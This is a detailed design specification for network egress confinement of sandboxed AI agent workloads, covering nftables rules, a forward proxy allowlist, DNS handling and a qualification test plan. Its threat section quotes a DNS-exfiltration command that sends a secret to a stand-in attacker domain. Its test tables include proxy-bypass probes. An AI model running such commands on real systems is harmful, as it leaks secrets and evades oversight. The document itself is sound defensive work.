# Specification: Gate 0D Default-Deny Sandbox Egress Architecture & Qualification Design

**Status:** APPROVED (Design & Planning Only; User Approved 2026-10-12) / Pending Checkpoint A
**Gate Status:** UNQUALIFIED (Blocks implementation of Sandbox Network Infrastructure and dependent tasks)
**User Design Approval:** Approved by user on 2026-10-12 ("i approved the design look good to me"). Clarification: This approval applies solely to the architectural design and planning. It does not constitute Checkpoint A completion, security sign-off, qualification, implementation approval, or authorization for host changes.
**Author:** Documentation Implementation Specialist
**Date:** 2026-10-11 (Updated 2026-10-12)
**Target Platform:** Single-Host Linux (`linux/amd64`), Native Docker Engine, Operator-Managed Firewall (`nftables` / `iptables`)
**Specification File:** `docs/superpowers/specs/2026-10-11-gate-0d-egress-confinement-design.md`

---

## 1. Executive Summary & Objective

This specification defines the architectural design, isolation boundaries, network traffic policies, DNS handling, and reproducible qualification criteria for **Gate 0D: Default-Deny Sandbox Egress**.

Under the target self-hosting operating model described in `docs/superpowers/specs/2026-10-11-self-hosting-readiness-design.md`, untrusted AI agent sessions, build commands, and arbitrary task code execute within unprivileged, capability-dropped Docker containers (`atm-project-<project_id>`).

The core security objective of Gate 0D is to guarantee **strict default-deny egress confinement**:
1. Untrusted task execution environments must be completely blocked from reaching the host operating system, host loopback, Docker bridge gateway IPs, host-level administrative listening ports (SSH, Docker daemon), and internal ATM control-plane infrastructure services (PostgreSQL `5432`, Redis `6379`, Dex `5556`, Control Plane API `8080`).
2. Project containers must be isolated from peer project containers on the same host (zero inter-project lateral movement or cross-bridge traffic).
3. Private internal networks (RFC 1918 `10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), IPv6 Unique Local Addresses (ULA `fc00::/7`), and link-local / cloud provider instance metadata endpoints (`169.254.169.254`, `fe80::/10`) must be unreachable.
4. Arbitrary outbound TCP, UDP, QUIC, and raw IP egress to the public internet must be strictly prohibited at Layer 3/Layer 4.
5. Task sandboxes may reach external networks solely via an explicit, unauthenticated, and constrained HTTP(S) forward proxy enforcing network-level ACLs (source IP/bridge filtering) and an exact FQDN allowlist limited to approved package registries (npm, PyPI, Go proxy, Crates.io, NuGet, Maven Central) and verified package download CDNs. Direct GitHub egress remains blocked (governed by Gate 0C), and model provider endpoints remain blocked pending Gate 0G resolution.

**Non-Scope Boundaries:**
Gate 0D addresses **network isolation only**. Filesystem mounts, shared volume segregation, host execution prevention, and Docker-socket isolation are governed and enforced by Gate 0B, Gate 0C, and the baseline container security configuration. Furthermore, ATM and OpenCode are strictly unprivileged control-plane components; they do not possess `CAP_NET_ADMIN` and must never mutate host firewall rules directly. Host network filtering is owned and operated by the host platform administrator.

---

## 2. Architectural Direction Analysis

Three architectural mechanisms were evaluated against the self-hosting threat model:

| **Dimension** | **Direction A: Host Packet Filtering Only (`nftables`/`iptables`)** | **Direction B: Forward Proxy Container Only (App-Level Egress)** | **Direction C: Hybrid Host Packet Filtering + Isolated DMZ Forward Proxy (SELECTED)** |
|---|---|---|---|
| **L3/L4 Confinement** | Strong. Kernel-enforced default-deny on bridge interfaces drops direct IP egress, RFC 1918, and metadata. | Ineffective as a security boundary. Relies solely on container env (`HTTP_PROXY`). Untrusted task code or malware ignores env and opens direct sockets. | Strong. Kernel-enforced host packet filtering drops all direct IP, metadata, and cross-project routing. Sandboxes can physically route only to proxy IP:port. |
| **L7 FQDN Filtering** | Extremely brittle. L3 firewalls cannot inspect HTTP `CONNECT` or SNI reliably across dynamic IPs and shared CDNs (Cloudflare, Fastly, AWS CloudFront). | Strong at L7, but easily bypassed at L3/L4 if container has direct network access. | Strong. Forward proxy terminates/inspects HTTP `CONNECT` requests, enforcing an exact FQDN allowlist regardless of upstream IP churn. |
| **Host Privilege Requirement** | High if orchestrated by ATM (would require ATM to have `CAP_NET_ADMIN` or root Docker privileges, violating the principle of least privilege). | Low for ATM (standard container deployment), but fails confinement guarantees. | Clean separation: Host operator owns static kernel packet filtering; ATM orchestrates unprivileged containers with zero `CAP_NET_ADMIN`. |
| **Inter-Project Isolation** | Achievable if host rules isolate each bridge subnet. | Fails if multiple project containers attach to the same proxy bridge. | Strong. Each project uses an isolated Docker bridge. Proxy sits on a separate egress DMZ network. No shared bridges. |
| **Recommendation** | Inadequate for CDN-backed package registries. | **REJECTED** (Env-only proxy is not a security boundary). | **APPROVED DESIGN (Direction C)** (Design approved by user on 2026-10-12; qualification probe and Checkpoint A pending). |

### Why Hybrid Enforcement is Mandatory
Relying solely on environment variables (`HTTP_PROXY`, `HTTPS_PROXY`) is ineffective because any untrusted child process can bypass them conceptually and mechanically:
- Standard HTTP client libraries and CLI tools support flags or configuration to bypass proxying (e.g. `--noproxy "*"` or explicit transport overrides).
- Untrusted binaries, task scripts, or malware can completely ignore process environment variables and establish direct TCP, UDP, or raw socket connections to arbitrary internal IPs, local ports, or gateway addresses using standard system calls (e.g. `socket.connect((target_ip, port))`).

Because client processes control their own networking syscalls, environment-based proxy configuration is merely an operational convention, not an enforced security boundary.

Conversely, relying solely on IP-based host firewall rules is impractical for package ecosystems: PyPI, npm, and Crates.io rely on multi-tenant CDNs where IPs change frequently and overlap with untrusted customer domains.

Therefore, **Direction C (Hybrid)** combines the strengths of both:
1. **Host-level packet filtering** creates a hard Layer 3/4 boundary: the sandbox network namespace has zero direct internet routing, zero access to private CIDRs, and cannot communicate with any host or peer bridge IP except the designated forward proxy IP on its designated listening port.
2. **The application forward proxy** enforces Layer 7 domain access controls, terminating HTTP proxy negotiations and verifying destination FQDNs against an explicit allowlist before establishing outbound TLS connections.

---

## 3. Network Topology & Traffic Data Flow

### 3.1 Network Topology & Zone Architecture

The deployment topology strictly isolates project containers, control-plane management, and the forward proxy:

```
+---------------------------------------------------------------------------------------------------+
| Host Operating System (Managed by Operator / Kernel Packet Filtering: nftables / iptables)        |
|                                                                                                   |
|  +--------------------------------+                  +-----------------------------------------+  |
|  | Project 1 Sandbox Bridge       |                  | Project 2 Sandbox Bridge                |  |
|  | Subnet: 172.30.1.0/24          |                  | Subnet: 172.30.2.0/24                   |  |
|  | +----------------------------+ |                  | +----------------------------+          |  |
|  | | atm-project-1 (Sandbox)    | |                  | | atm-project-2 (Sandbox)    |          |  |
|  | | IP: 172.30.1.2             | |                  | | IP: 172.30.2.2             |          |  |
|  | +--------------+-------------+ |                  | +--------------+-------------+          |  |
|  +----------------|---------------+                  +----------------|------------------------+  |
|                   |                                                   |                           |
|                   +------------------\             /------------------+                           |
|                                       v           v                                               |
|                    [ ATM Forward Confinement: DROP by default on ATM interfaces ]                                |
|                    [ ALLOW: Project Subnets -> Proxy IP:3128 ONLY ]                               |
|                    [ DROP: Project -> Host INPUT (Gateway / Ports) ]                              |
|                    [ DROP: Project 1 <-> Project 2 Inter-Bridge   ]                               |
|                                       |                                                           |
|                                       v                                                           |
|  +---------------------------------------------------------------------------------------------+  |
|  | Egress DMZ Bridge (Dedicated Docker Network: atm_egress_dmz)                                |  |
|  | Subnet: 172.30.200.0/24                                                                     |  |
|  |                                                                                             |  |
|  |  +---------------------------------------------------------------------------------------+  |  |
|  |  | atm-egress-proxy (Squid / Envoy Forward Proxy)                                        |  |  |
|  |  | IP: 172.30.200.10, Port: 3128                                                         |  |  |
|  |  | Enforces: Strict FQDN Allowlist (npm, pypi, crates, go, nuget, maven)                   |  |  |
|  |  | Upstream DNS: Validates public IP only; rejects RFC 1918 / Loopback / Metadata        |  |  |
|  |  +-------------------------------------------+-------------------------------------------+  |  |
|  +----------------------------------------------|----------------------------------------------+  |
|                                                 | (Outbound HTTPS only via Proxy)                 |
|                                                 v                                                 |
|                                        [ Host WAN / Internet ]                                    |
|                                                 |                                                 |
|                                                 v                                                 |
|                          Approved Package Registries (registry.npmjs.org, etc.)                    |
+---------------------------------------------------------------------------------------------------+
```

### 3.2 Network Zone Rules and Interfaces
1. **Isolated Project Bridges (`atm-project-<id>`):**
   - Each project container is attached to an independent, dedicated Docker bridge network created dynamically by ATM.
   - Project containers are **never** attached to `bridge` (default Docker bridge), `host`, or `agent_backend` (internal control-plane network).
   - Project containers are **never** attached to `atm_egress_dmz` directly. Attaching project sandboxes to the proxy network would create network adjacency, allowing task code to probe the proxy container’s internal interfaces or other containers on that network.
2. **Dedicated Egress DMZ Network (`atm_egress_dmz`):**
   - The forward proxy container (`atm-egress-proxy`) runs attached only to `atm_egress_dmz`.
   - Host routing forwards packets between the project bridge interfaces and the DMZ interface, strictly filtered by host firewall rules.
   - The proxy container must be permitted outbound forwarding to the host WAN interface for DNS (`udp/tcp dport 53`) and outbound HTTPS (`tcp dport 443`) to resolve and connect to allowlisted upstream package registries.
3. **Stateful Forwarding Rules (Host Kernel):**
   - **Direction: Sandbox -> Proxy:** Allowed solely for `tcp dport 3128` destined to the proxy IP (e.g., `172.30.200.10`).
   - **Direction: Proxy -> Sandbox:** Established return reply connections only (`ct direction reply ct state established accept`). New inbound connections initiated by the proxy into the sandbox are **strictly dropped**. Note: Secondary `related` helper connections are intentionally omitted to avoid broad connection matching; PMTU/ICMP error-handling dynamics remain an unresolved qualification consideration.
   - **Direction: Sandbox -> Direct External WAN:** Dropped.
   - **Direction: Sandbox -> Host Gateway / Host IP (INPUT chain):** Default dropped (`iifname "atm-proj-*" drop`). Prevents sandbox from reaching any host-bound services (SSH, Docker socket proxies, local management, control plane).
   - **Direction: Sandbox A -> Sandbox B (Inter-project forwarding):** Dropped.
   - **Direction: Proxy -> External WAN:** Permitted for outbound proxy DNS and TLS connections (`iifname "atm-egress-dmz" oifname "<wan_interface>"`).
4. **IPv4 and IPv6 Parity:**
   - Egress blocking applies identically to IPv6.
   - Unless full IPv6 stateful proxying and FQDN filtering are explicitly configured and qualified, IPv6 forwarding from sandbox bridges is disabled per-interface at the host kernel (`sysctl -w net.ipv6.conf.<bridge_iface>.disable_ipv6=1` for each project bridge interface; never via host-global `net.ipv6.conf.all.disable_ipv6=1` which would break unrelated host workloads).
   - In addition, kernel packet filtering must match both IPv4 and IPv6 families (`table inet`) and explicitly drop all IPv6 traffic from project bridge interfaces (`iifname "atm-proj-*" drop`).

---

## 4. Host Firewall Ownership & Fail-Closed Launch Contract

### 4.1 Boundary of Responsibility
- **Host Platform Operator:** Owns, deploys, and persists the host firewall policy (e.g. `nftables.conf` or persistent `iptables` chains). The operator guarantees that Docker daemon restarts do not flush or bypass the egress rules.
- **ATM Control Plane:** Operates with zero host network administrative privilege (`CAP_NET_ADMIN` dropped). ATM does **not** install kernel modules, rewrite routing tables, or execute firewall mutation commands.
- **Sandbox Container:** Launched with `--cap-drop=ALL` and `--security-opt no-new-privileges:true`. Cannot configure interfaces, manipulate routing, or alter firewall state.

### 4.2 Fail-Closed Sandbox Launch Contract & Pre-Implementation Blocker

To satisfy the non-negotiable requirement that ATM must never launch a sandbox in an unconfined state, container startup must fail closed if host egress filtering is not active and healthy.

> **CRITICAL PRE-IMPLEMENTATION BLOCKER:**
> Because ATM lacks `CAP_NET_ADMIN` and host root privileges, how ATM verifies host firewall health before container launch must be formally resolved before implementation.

**Candidate Verification Contracts:**
1. **Contract 1: Active Gateway Canary Probe (Harmless Test Fixture Probe):**
   - ATM launches a short-lived preflight canary probe container in the project network before initializing the task sandbox.
   - The probe attempts an immediate connection to a controlled, harmless test canary listener provisioned within the isolated qualification environment (e.g., an explicit blocked test port on the bridge gateway or dedicated negative canary IP), with a 1-second timeout.
   - **Crucial Safety Mandate:** Probes must **never** be sent to `169.254.169.254` or any real cloud instance metadata service (IMDS) endpoint. In production cloud or virtualized environments, probing live metadata endpoints creates serious unintended data exposure risks. A positive control must prove that the canary listener is reachable when ATM rules are deliberately absent in a disposable test fixture, and proven blocked when rules are active.
   - If the canary connection succeeds when rules should be active, the host firewall is deemed broken. Container startup **aborts immediately** with an error: `EgressConfinementError: Host firewall verification failed; sandbox startup aborted`.
2. **Contract 2: Operator Attestation & Readiness File (Passive File Marker):**
   - Host operator's systemd unit writes a cryptographically validated readiness token or timestamped status file to `/etc/atm/firewall-ready` upon verifying `nftables` rules.
   - Control plane checks for valid attestation before provisioning project networks.
   - *Limitation:* Does not actively test actual packet filtering behavior; canary probe (Contract 1) provides true behavioral verification.

**Fail-Closed Invariant:**
Under no circumstances may ATM fall back to starting a project sandbox with standard unconfined Docker bridge networking if network isolation fails or cannot be verified.

---

## 5. Forward Proxy Policy & Allowlist Specifications

### 5.1 Protocol and Method Constraints
- **Supported Protocols:** HTTP/1.1 and HTTP/2 `CONNECT` tunneling for HTTPS egress only.
- **Prohibited Protocols:** Raw TCP routing, UDP, QUIC (HTTP/3), and general SOCKS proxying are strictly disabled. Package managers must communicate via standard HTTPS proxy tunnels.
- **HTTP Methods:** For cleartext HTTP, only `GET` and `HEAD` to approved package registry metadata endpoints are permitted. All `CONNECT` requests must target port `443` only.

### 5.2 Destination Allowlist Policy
The forward proxy enforces an exact FQDN allowlist. Broad wildcards (e.g. `*.com`, `*.net`, `*.*`) and broad multi-tenant cloud wildcards (e.g. `*.amazonaws.com`, `*.cloudfront.net`) are **strictly prohibited**.

Approved destinations are limited to official package ecosystems:

| Ecosystem | Approved Hostnames / FQDNs | Purpose & Canonical Ecosystem Reference | Status |
|---|---|---|---|
| **Node / npm** | `registry.npmjs.org` | Primary npm registry metadata and package tarballs ([npm Registry Docs](https://docs.npmjs.com/cli/v10/using-npm/registry)). | Candidate / Pending Security Review and Gate 0D Qualification |
| | `registry.yarnpkg.com` | Yarn registry alias ([Yarn Configuration Docs](https://yarnpkg.com/configuration/yarnrc#npmRegistryServer)). | Candidate / Pending Security Review and Gate 0D Qualification |
| **Python / PyPI** | `pypi.org` | PyPI web UI and package index metadata ([PyPI JSON API](https://docs.pypi.org/api/json/)). | Candidate / Pending Security Review and Gate 0D Qualification |
| | `files.pythonhosted.org` | Official PyPI package distribution CDN artifact host ([Python Packaging Guide](https://packaging.python.org/en/latest/guides/index-mirrors-and-caches/)). | Candidate / Pending Security Review and Gate 0D Qualification |
| **Go** | `proxy.golang.org` | Official Go module mirror proxy ([Go Module Mirror Reference](https://proxy.golang.org/)). | Candidate / Pending Security Review and Gate 0D Qualification |
| | `sum.golang.org` | Official Go module checksum database ([Go Checksum Database Reference](https://sum.golang.org/)). | Candidate / Pending Security Review and Gate 0D Qualification |
| **Rust / Crates** | `crates.io` | Official Cargo package index metadata ([Cargo Reference - Registries](https://doc.rust-lang.org/cargo/reference/registries.html)). | Candidate / Pending Security Review and Gate 0D Qualification |
| | `index.crates.io` | Sparse index endpoints (Cargo 1.68+ [RFC 2789](https://doc.rust-lang.org/cargo/reference/registry-index.html)). | Candidate / Pending Security Review and Gate 0D Qualification |
| | `static.crates.io` | Package crate file downloads ([Cargo Configuration](https://doc.rust-lang.org/cargo/reference/config.html)). | Candidate / Pending Security Review and Gate 0D Qualification |
| **.NET / NuGet** | `api.nuget.org` | NuGet v3 service index and package downloads ([NuGet v3 API Documentation](https://learn.microsoft.com/en-us/nuget/api/overview)). | Candidate / Pending Security Review and Gate 0D Qualification |
| **Java / Maven** | `repo1.maven.org` | Maven Central repository artifact server ([Central Repository Documentation](https://central.sonatype.org/)). | Candidate / Pending Security Review and Gate 0D Qualification |
| | `repo.maven.apache.org` | Maven Central alias ([Apache Maven Guides](https://maven.apache.org/guides/mini/guide-mirror-settings.html)). | Candidate / Pending Security Review and Gate 0D Qualification |

#### Handling of Redirects and Dynamic CDNs
Package managers frequently encounter HTTP 301/302 redirects during package tarball resolution.
- Any redirect to a host **not** on the explicit allowlist will be rejected by the proxy with HTTP `403 Forbidden`.
- **Policy Invariant:** New download hostnames must be individually evaluated and added to the configuration. Blanket allowlisting of entire CDNs (e.g. `*.fastly.net` or `*.cloudflare.com`) is prohibited because it allows exfiltration to arbitrary customer buckets hosted on the same CDN.
- If an approved package manager introduces a new redirect host during qualification probes, that exact FQDN must be verified and added to the allowlist before sign-off.

#### Excluded and Blocked Services
- **GitHub (`github.com`, `api.github.com`):** **BLOCKED**. In accordance with Gate 0C, sandboxes do not interact directly with GitHub. All Git synchronization is mediated out-of-band by the trusted control plane.
- **Model Providers (`api.openai.com`, `api.anthropic.com`):** **BLOCKED**. Model access is strictly prohibited until Gate 0G resolves the credential isolation architecture.
- **Arbitrary Cloud Services / Metadata:** `169.254.169.254`, `metadata.google.internal`, etc. are blocked at both proxy and host firewall levels.

### 5.3 Proxy Upstream DNS & SSRF Defenses
The proxy container performs upstream DNS resolution for external destinations.
- **Anti-SSRF Protection:** The proxy's DNS resolver must inspect and normalize all resolved A (IPv4) and AAAA (IPv6) records against special-use, private, and internal address registries. The proxy must abort the connection immediately with HTTP `502 Bad Gateway` if any hostname resolves to:
  - IPv4 private / internal ranges: RFC 1918 (`10.0.0.0/8`, `172.16.0.0/12`, `192.168.0.0/16`), loopback (`127.0.0.0/8`), link-local (`169.254.0.0/16`), broadcast (`255.255.255.255`), shared address space (`100.64.0.0/10`), or multicast (`224.0.0.0/4`).
  - IPv6 non-global ranges: Loopback (`::1/128`), unspecified (`::/128`), Unique Local Addresses (ULA `fc00::/7`), link-local (`fe80::/10`), IPv4-mapped IPv6 addresses (`::ffff:0:0/96` mapping to any prohibited IPv4 range), and IPv6 multicast (`ff00::/8`).
  - This anti-SSRF policy is mandatory to defeat DNS rebinding attacks and must be qualification-tested in Checkpoint A.
- **Proxy Boundary Limitations (SNI / TLS Inspection):**
  - The proxy acts as a non-MITM forward proxy terminating the HTTP `CONNECT` tunnel. It validates the FQDN in the `CONNECT` line and matches it against the TLS ClientHello Server Name Indication (SNI).
  - *Residual Risk:* Without full TLS interception (MITM with private CA injection), the proxy cannot inspect decrypted payload contents within the HTTPS tunnel to an allowlisted registry. Malicious code could attempt data exfiltration by embedding data into HTTP request paths or headers sent to `registry.npmjs.org`. Because MITM proxying introduces severe CA trust and security complexity inside task runtimes, this residual risk is acknowledged and mitigated by default-deny FQDN filtering and Gate 0C credential absence.
  - *Encrypted Client Hello (ECH):* ECH could obscure the true destination SNI if clients negotiate ECH. To prevent domain-fronting and SNI evasion, the proxy configuration must disallow ECH or reject `CONNECT` tunnels where the SNI cannot be validated.

---

## 6. Container DNS Resolution Architecture

### 6.1 Docker Embedded Resolver Risk Analysis
Docker bridge networks utilize an embedded DNS resolver at `127.0.0.11`. According to official Docker documentation:
- Custom bridge networks automatically configure `/etc/resolv.conf` with `nameserver 127.0.0.11`.
- `127.0.0.11` forwards external lookups to the host’s configured DNS servers.
- **Exfiltration Threat:** If a sandbox has access to `127.0.0.11`, an untrusted process can perform arbitrary DNS queries (e.g., `nslookup $(cat secret).attacker.com`). Even if all TCP/UDP data egress is blocked, data can be exfiltrated via external DNS tunneling.

### 6.2 Proposed DNS Confinement Direction
To prevent DNS-based data exfiltration:
1. **Application-Level Resolution Delegation:**
   - Package managers configured with `HTTP_PROXY` and `HTTPS_PROXY` delegate hostname resolution directly to the proxy via the HTTP `CONNECT host:443` request. The client does **not** need local DNS resolution for proxy-mediated requests.
2. **Local Resolver Confinement Candidate:**
   - Sandboxes should launch with custom `--dns` configuration preventing forwarding to public upstream resolvers.
   - Setting `--dns=127.0.0.1` inside the container namespace configures an inactive local loopback address, causing local container DNS lookups to fail immediately with `connection refused`.
   - *Status:* `--dns=127.0.0.1` is a **candidate configuration requiring qualification probing**. The probe must confirm whether this completely neutralizes `127.0.0.11` forwarding without causing unintended package manager failures.
   - *Alternative Policy Resolver:* If specific build tools strictly require working local DNS (e.g., resolving `localhost` or proxy hostname), ATM must configure a local restricted DNS server that answers only internal addresses and returns `NXDOMAIN` for all public queries.

---

## 7. Concrete Packet Filtering Specifications (Illustrative nftables Ruleset)

The following reference `nftables` ruleset illustrates the required stateful packet filtering topology. It is deployed and maintained exclusively by the host platform operator.

> **CRITICAL OPERATIONAL & SYNTACTIC CONSTRAINTS:**
> - **Illustrative Snippet:** This ruleset is an architectural reference only and must be validated by the host operator using `nft -c` against the host's active firewall configuration before deployment. It has not been compiled or applied to a live host in this documentation phase.
> - **Host Project Isolation (No Global Hook Drop):** The ruleset uses `policy accept` on host-wide base hooks and explicitly scopes all restrictive filtering to ATM-managed interfaces (`atm-proj-*`, `atm-egress-dmz`). It **must never** set a global `policy drop` on the host's `forward` or `input` hooks, as doing so would break unrelated Docker containers, default bridges (`docker0`), virtual machines, or other non-ATM workloads sharing the host.
> - **Interface & Address Placeholders:** Bridge names (`atm-proj-*`, `atm-egress-dmz`), WAN interfaces (`eth0`), and IP addresses (`172.30.200.10`) are illustrative placeholders. Operators must select non-conflicting subnets and map exact interface names matching their host network configuration.
> - **Proxy WAN Egress & Control-Plane Paths:** The forward filter explicitly allows proxy WAN egress for upstream package retrieval and DNS resolution. Separate control-plane management paths (e.g. Traefik to OpenCode) operate over distinct internal networks and are not routed through project egress bridges.

```nftables
table inet atm_confinement {
    # Illustrative placeholders: operator must configure non-overlapping values
    define PROXY_IP = 172.30.200.10
    define PROXY_PORT = 3128
    define WAN_IFACE = "eth0"

    chain forward {
        # Priority filter hook with accept policy so unrelated host/docker forwarding is untouched
        type filter hook forward priority 0; policy accept;

        # 1. Drop invalid connection states on ATM-managed interfaces
        iifname { "atm-proj-*", "atm-egress-dmz" } ct state invalid drop

        # 2. Project Sandbox -> Forward Proxy connections:
        # Outbound original packets from sandbox to proxy IP/port
        iifname "atm-proj-*" oifname "atm-egress-dmz" ip daddr $PROXY_IP tcp dport $PROXY_PORT ct direction original ct state new,established accept
        # Return reply packets from proxy to sandbox
        iifname "atm-egress-dmz" oifname "atm-proj-*" ip saddr $PROXY_IP tcp sport $PROXY_PORT ct direction reply ct state established accept

        # 3. Forward Proxy -> External WAN connections:
        # Outbound original packets from DMZ proxy to WAN for approved package ports (443) and DNS (53)
        iifname "atm-egress-dmz" oifname $WAN_IFACE tcp dport 443 ct direction original ct state new,established accept
        iifname "atm-egress-dmz" oifname $WAN_IFACE udp dport 53 ct direction original ct state new,established accept
        iifname "atm-egress-dmz" oifname $WAN_IFACE tcp dport 53 ct direction original ct state new,established accept
        # Return reply packets from WAN to DMZ proxy for approved package ports (443) and DNS (53)
        iifname $WAN_IFACE oifname "atm-egress-dmz" tcp sport 443 ct direction reply ct state established accept
        iifname $WAN_IFACE oifname "atm-egress-dmz" udp sport 53 ct direction reply ct state established accept
        iifname $WAN_IFACE oifname "atm-egress-dmz" tcp sport 53 ct direction reply ct state established accept

        # 4. Drop any attempts by proxy to initiate new connections into project sandboxes
        iifname "atm-egress-dmz" oifname "atm-proj-*" drop

        # 5. Default-deny for all other project bridge forwarding (drops direct WAN, IPv6, inter-project bridge traffic)
        iifname "atm-proj-*" drop

        # 6. Default-deny for all other forward traffic originating from the DMZ (blocks lateral forwarding to internal bridges/subnets)
        iifname "atm-egress-dmz" drop
    }

    chain input {
        # Priority filter hook with accept policy to preserve unrelated host services
        type filter hook input priority 0; policy accept;

        # 1. Default-deny: Project sandboxes must NEVER reach any host-bound listening service or gateway IP.
        # Dropped unconditionally BEFORE any conntrack evaluation to terminate pre-existing/stale flows.
        iifname "atm-proj-*" drop

        # 2. Default-deny: Egress DMZ proxy container must NEVER reach host-bound services (SSH, Docker API, DBs).
        # Note on Proxy DNS: Forward proxy resolves external names via public upstream resolvers routed through WAN ($WAN_IFACE),
        # NOT via host-listening resolvers (systemd-resolved). If an operator intentionally configures the proxy to query a
        # host-local DNS resolver, an exact IP/port accept rule (ip daddr <host_dns_ip> udp dport 53 accept) must be explicitly
        # inserted here prior to the drop. Otherwise, all DMZ-to-host input traffic is strictly blocked.
        iifname "atm-egress-dmz" drop
    }
}
```

> **Operational Note on Pre-Existing Conntrack State Invalidation:**
> Terminal drops in `chain forward` and `chain input` ensure that unapproved *new* flows cannot be established. However, in Linux Netfilter, pre-existing connections present in the conntrack table prior to firewall insertion could persist if packet tuples match established flow rules. The reference ruleset mitigates this by strictly scoping all established rules to exact directional flags (`ct direction reply`), pairwise interfaces, and transport port selectors. If an operator requires guaranteed immediate eviction of active conntrack entries for project subnets without disrupting other host workloads, scoped tuple deletion can be executed by matching project subnets (e.g. `conntrack -D -s <project_subnet>` and `conntrack -D -d <project_subnet>`). Global flushing (`conntrack -F`) is prohibited on multi-tenant hosts as it terminates active connections across unrelated host workloads. The exact command sequence for conntrack lifecycle management remains dependent on host qualification and operator environment.

---

## 8. Reproducible Future Qualification Plan

The qualification probe for Gate 0D must be executed on an explicitly authorized, isolated Linux test host (or dedicated QEMU/KVM virtual machine) running native Docker Engine.

> **NOTICE:** No test was executed, and no host state was altered during this specification phase. Gate 0D remains **UNQUALIFIED**.

### 8.1 Test Matrix & Verification Commands

All qualification probes are executed from within a candidate project container (`atm-project-probe`). Note that `--dns=127.0.0.1` is explicitly specified to test local resolver confinement per §6.2:

```bash
# Setup candidate probe container attached to test project bridge
docker run -d --name atm-project-probe \
  --network atm-project-test \
  --dns=127.0.0.1 \
  --cap-drop=ALL \
  --security-opt no-new-privileges:true \
  --read-only \
  -e HTTP_PROXY="http://172.30.200.10:3128" \
  -e HTTPS_PROXY="http://172.30.200.10:3128" \
  debian:bookworm-slim sleep 3600
```

#### Positive Qualification Probes (Allowed Package Registries)
Each supported package manager toolchain must successfully fetch package metadata or tarballs through the proxy without credentials:

| Test ID | Command Inside Container | Expected Output / Assertion | Exit Code |
|---|---|---|---|
| `POS-0D-01` | `curl -f -s -S -o /dev/null https://registry.npmjs.org/express` | HTTP 200 OK via proxy | `0` |
| `POS-0D-02` | `curl -f -s -S -o /dev/null https://pypi.org/pypi/requests/json` | HTTP 200 OK via proxy | `0` |
| `POS-0D-03` | `curl -f -s -S -o /dev/null https://files.pythonhosted.org/packages/source/p/pip/pip-24.0.tar.gz` | HTTP 200 OK via proxy (verified tarball download) | `0` |
| `POS-0D-04` | `curl -f -s -S -o /dev/null https://proxy.golang.org/github.com/gin-gonic/gin/@v/list` | HTTP 200 OK via proxy | `0` |
| `POS-0D-05` | `curl -f -s -S -o /dev/null https://index.crates.io/co/nf/config` | HTTP 200 OK via proxy | `0` |
| `POS-0D-06` | `curl -f -s -S -o /dev/null https://api.nuget.org/v3/index.json` | HTTP 200 OK via proxy | `0` |
| `POS-0D-07` | `curl -f -s -S -o /dev/null https://repo1.maven.org/maven2/org/apache/commons/commons-lang3/maven-metadata.xml` | HTTP 200 OK via proxy | `0` |

#### Negative Qualification Probes (Prohibited Destinations & Bypass Attempts)
All unauthorized requests must fail closed with connection timeouts or immediate network unreachable errors. To rigorously verify Layer-3 kernel filtering (rather than Layer-7 proxy filtering), probes testing direct network paths explicitly disable or bypass proxy environment variables (`--noproxy "*"` or `env -u HTTP_PROXY -u HTTPS_PROXY`).

> **CRITICAL QUALIFICATION TESTBED MANDATE:**
> 1. Probes must **never** target `169.254.169.254` or any live cloud provider instance metadata service (IMDS). Probing real metadata endpoints risks accidental data retrieval or credential exposure on cloud VMs.
> 2. Probes must **never** target public third-party endpoints (e.g. `1.1.1.1` or `8.8.8.8`) for negative egress verification. Negative probes must remain entirely self-contained within the isolated disposable test fixture.
> 3. All negative destination tests must run inside an isolated, disposable Linux test host or QEMU/KVM VM using controlled canary listeners (e.g. a dedicated canary container on a dummy WAN-side IP `198.51.100.50` or blocked host gateway port).
> 4. **Rigorous Positive/Negative Controls:** Every canary test must have a demonstrated **positive control** (proving the listener is actively reachable and receives traffic when ATM rules are deliberately absent in the test fixture) and a verified **negative control** (proving packets are dropped at Layer 3 when ATM rules are enabled). For TCP endpoints, probes must verify timeout/zero bytes rather than application-layer protocol mismatches (e.g. using `curl` against an SSH or Postgres port which could fail with protocol parsing errors after a successful TCP handshake). For UDP endpoints, connection return codes are insufficient; the test must observe that 0 packets reach the controlled canary listener via packet capture.

| Test ID | Target / Test Condition | Command Inside Container | Expected Behavior / Error Assertion |
|---|---|---|---|
| `NEG-0D-01` | Controlled Gateway Canary (L3 Drop) | `curl --noproxy "*" -m 2 http://172.30.1.1:9999/canary` | Timeout (exit 28); 0 bytes exchanged (Controlled HTTP test canary listener) |
| `NEG-0D-02` | Host Gateway Mock API (L3 Drop) | `curl --noproxy "*" -m 2 http://172.30.1.1:8080/health` | Timeout (exit 28); 0 bytes exchanged (Controlled HTTP mock API) |
| `NEG-0D-03` | Host Management Canary (L3 Drop) | `nc -z -v -w 2 172.30.1.1 2222` | Connection timed out (exit != 0); 0 bytes exchanged (Controlled TCP mock listener) |
| `NEG-0D-04` | Control Plane DB Mock (L3 Drop) | `nc -z -v -w 2 172.28.0.2 5432` | Connection timed out / unreachable (exit != 0); 0 bytes exchanged (Controlled mock listener on `172.28.0.0/16`) |
| `NEG-0D-05` | Peer Project Sandbox (L3 Drop) | `curl --noproxy "*" -m 2 http://172.30.2.2:80` | Timeout (exit 28) or Host unreachable (Controlled peer sandbox canary) |
| `NEG-0D-06` | Controlled WAN Test IP (L3 Bypass) | `curl --noproxy "*" -m 2 http://198.51.100.50:80/canary` | Timeout (exit 28); 0 bytes exchanged (Controlled WAN fixture IP, never public internet) |
| `NEG-0D-07` | Controlled WAN IP without Env | `env -u HTTP_PROXY -u HTTPS_PROXY curl -m 2 http://198.51.100.50:80/canary` | Timeout (exit 28); 0 bytes exchanged (Controlled WAN fixture IP, never public internet) |
| `NEG-0D-08` | GitHub Direct Access (L7 Proxy) | `curl -m 2 https://github.com` | Blocked by proxy (HTTP 403 Forbidden) |
| `NEG-0D-09` | Model Provider API (L7 Proxy) | `curl -m 2 https://api.anthropic.com` | Blocked by proxy (HTTP 403 Forbidden) |
| `NEG-0D-10` | Non-Allowed Domain (L7 Proxy) | `curl -m 2 https://example.com` | Blocked by proxy (HTTP 403 Forbidden) |
| `NEG-0D-11` | Controlled WAN UDP Canary (L3 Drop) | `nc -z -v -u -w 2 198.51.100.50 5353` | Timeout / 0 packets received at controlled WAN UDP packet capture |
